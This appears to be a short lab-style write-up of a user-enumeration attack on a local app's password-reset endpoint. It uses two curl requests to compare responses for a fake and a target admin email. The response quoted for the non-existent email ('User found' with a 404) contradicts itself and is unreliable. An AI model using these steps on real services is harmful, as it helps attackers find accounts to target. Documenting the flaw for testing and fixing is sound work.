## Exploitation Steps
The goal is to determine if a specific email (like the CEO's or an admin's) is registered on the platform.

### 1. Test a Non-Existent Email
```bash
curl -X POST "http://127.0.0.1:8000/reset-password" -H "Content-Type: application/json" -d '{"email": "fake@test.com"}'
```
Response: {"detail": "User found"} (Error 404)


Test a Target Email
```bash
curl -X POST "http://127.0.0.1:8000/reset-password" -H "Content-Type: application/json" -d '{"email": "admin@example.com"}'
```

Response: {"message": "Reset link sent to admin@example.com"} (Success 200).